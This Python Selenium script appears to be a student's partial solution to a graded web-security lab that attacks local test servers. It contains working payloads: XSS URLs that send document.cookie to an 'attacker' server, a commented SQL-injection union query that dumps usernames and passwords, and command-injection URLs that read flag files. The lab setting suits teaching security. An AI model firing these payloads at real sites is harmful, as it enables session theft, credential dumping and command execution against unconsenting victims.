from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from bs4 import BeautifulSoup
import base64
import grader

# NOTE: If you choose to run the servers on different ports for testing, please remember to set it back before submission.
TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
ATTACKER_SERVER_ENDPOINT = 'http://localhost:1338'

def xss(vuln_type, level):
    # TODO remove this if statement
    if(vuln_type != '2'):
        return
    if(level != 'low' and level != 'medium' and level != 'high'):
        return
    print("SENDING REQUEST")
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options) # Starts the browser

    # driver.get(TARGET_SERVER_ENDPOINT) # Makes a request to the specified URL.

    # DO SOMETHING

    # Reflected XSS
    if vuln_type == '1' and level == 'low':
        url = "http://localhost:1337/xss/1/low?comment=%22%3Cscript%3Evar%20cookie=document.cookie;$.ajax({url:%20%22http://localhost:1338/xss/reflected_low?cookie=%22.concat(cookie)});%3C/script%3E%22"
        driver.get(url)
    elif vuln_type == '1' and level == 'medium':
        url = "http://localhost:1337/xss/1/medium?comment=%3CBODY%20ONLOAD=$.ajax({url:%22http://localhost:1338/xss/reflected_medium?cookie=%22.concat(document.cookie)})%3E"
        driver.get(url)
    elif vuln_type == '1' and level == 'high':
        url = "http://localhost:1337/xss/1/high?comment=%3CBODY%20ONLOAD=$.ajax({url:%22http://localhost:1338/xss/reflected_high?cookie=%22.concat(document.cookie)})%3E"
        driver.get(url)

    # Stored XSS
    print(level)
    if vuln_type == '2' and level == 'low':
        url = "http://localhost:1337/xss/2/low?comment=%22%3Cscript%3E$.ajax({url:%22http://localhost:1338/xss/stored_low?cookie=%22.concat(document.cookie)});%3C/script%3E%22"
        driver.get(url)
    elif vuln_type == '2' and level == 'medium':
        pass


    # Grader verification should be done in attacker_server/server.py

    driver.quit() # Closes the browser

def sql():
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # URL to get passwords http://localhost:1337/sql_injection/low/id/1'%20or%20'1'%20=%20'1'%20union%20select%20id,%20name,%20surname,%20password%20from%20'users
    driver.get(TARGET_SERVER_ENDPOINT)

    soup = BeautifulSoup(driver.page_source) # Get the page contents and use for parsing.
    tr_elements = soup.find_all('tr') # Refer to the BeautifulSoup documentation for more details.


    # TODO: Populate the user_pass_list
    # user_pass_list = [] # Where this should be a list of lists for containing the users and passwords
                        # eg. [['username', 'password']]


    # grader.sql_verify('low', user_pass_list)

    driver.quit()

def command_injection(level):

    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # NOTE: Remember to decode the flag before sending it to the grader.
    # grader.command_injection_verify(level, flag)
    # Request url for low level
    # http://localhost:1337/command_injection/low?ip=example.com;cat%20./server/flags/low.txt%20|%20base64%20-d
    # Request url for medium level
    # http://localhost:1337/command_injection/medium?ip=%20]%20%20||%20%20cat%20./server/flags/medium.txt%20|%20base64%20-d
    # Request url for high level
    # http://localhost:1337/command_injection/high?ip=;cat%3Cstudent/server/flags/high.txt
    driver.quit()

def csrf(level):

    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # Do the requests and decoding
    if(level == 'low'):
        pass
    # grader.csrf_verify(level, secret_msg, comments) # where secret_msg is the expected comment in the database from your attack.

    driver.quit()

if __name__ == '__main__':

    # NOTE: Feel free to modify the code here for your own purposes.
    # The code below can be used as an example.

    # Commenting out this code until this piece is implemented
    # for level in ['low', 'medium', 'high']:
    #     command_injection(level)

    # sql()

    for vuln_type in ['1', '2', '3']:
        for level in ['low', 'medium', 'high']:
            xss(vuln_type, level)
    #
    # for level in ['low', 'medium', 'high']:
    #     csrf(level)
